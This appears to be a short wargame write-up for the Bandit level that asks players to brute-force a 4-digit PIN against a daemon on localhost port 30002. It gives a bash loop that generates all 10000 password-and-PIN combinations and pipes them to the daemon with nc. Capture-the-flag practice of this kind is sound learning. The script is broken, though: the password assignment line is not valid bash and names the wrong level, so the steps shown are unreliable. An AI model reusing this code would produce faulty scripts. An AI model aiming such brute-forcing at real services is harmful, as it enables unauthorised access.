A daemon is listening on port 30002 and will give you the password for bandit25 if 
given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to 
retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.


here we wave to create another shell-script to send kind of like a dictionary

	1) shell:
		#!/bin/bash
			pasBandit23: "asdasd"
			for i in {0000..9999}
			do
				echo $pasBandit23 $i
			done


		-> save the script into tmp folder (mktemp -d)
		-> remember to chmod +x it
		-> now here is the thing, we can cat the output of the script we've just created
			and store all those combinations or number into a file
		-> ./script.sh > passwrd.txt
	
		-> now we can just simply do: cat passwrd.txt | nc localhost 30002
			and should print the flag!
